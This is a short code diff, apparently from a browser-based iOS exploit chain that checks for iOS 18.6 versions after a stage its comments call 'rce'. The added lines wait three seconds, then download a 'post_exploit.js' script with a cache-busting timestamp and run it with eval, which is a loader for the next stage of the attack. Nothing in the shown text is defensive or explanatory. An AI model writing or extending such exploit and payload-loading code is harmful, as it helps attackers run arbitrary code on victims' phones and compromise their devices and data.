@@ -181,6 +181,16 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         {
             //print("Got exception while running rce: " + e);
         }
+        
+        setTimeout(() => {
+            try {
+                let postExploit = getJS(`post_exploit.js?${Date.now()}`);
+                eval(postExploit);
+            } catch(e) {
+                //print("Post-exploit load failed: " + e);
+            }
+        }, 3000);
+        
         let desiredHost = "";
         desiredHost = localHost;
             if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
